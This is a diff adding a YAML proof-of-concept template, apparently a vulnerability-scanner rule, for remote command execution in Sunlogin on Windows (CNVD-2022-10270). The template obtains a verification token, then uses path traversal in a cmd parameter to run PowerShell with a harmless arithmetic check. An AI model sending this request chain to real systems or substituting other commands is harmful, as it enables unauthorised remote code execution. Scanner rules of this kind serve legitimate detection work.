@@ -1,0 +1,34 @@
+name: poc-yaml-sunlogin-windows-cnvd-2022-10270-rce
+binding: 7ad832cb-c24f-43f8-9a17-eab5c7aeb6d3
+manual: true
+detail:
+    author: Kai
+    links:
+        - https://github.com/Mr-xn/sunlogin_rce
+    vulnerability:
+        id: CT-384002
+        level: high
+transport: http
+set:
+    randInt0: randomInt(1000, 9999)
+    randInt1: randomInt(1000, 9999)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /cgi-bin/rpc?action=verify-haras
+        expression: response.status == 200 && response.body.bcontains(b"verify_string") && response.body.bcontains(b"__code") && response.body.bcontains(b"enabled")
+        output:
+            search: |-
+                '"verify_string":"(?P<token>\\w+)"'.bsubmatch(response.body)
+            token: search["token"]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fwindowspowershell%2fv1.0%2fpowershell+{{randInt0}}*{{randInt1}}
+            headers:
+                Cookie: CID={{token}}
+        expression: response.status == 200 && response.body.bcontains(bytes(string(randInt0 * randInt1)))
+expression: r0() && r1()
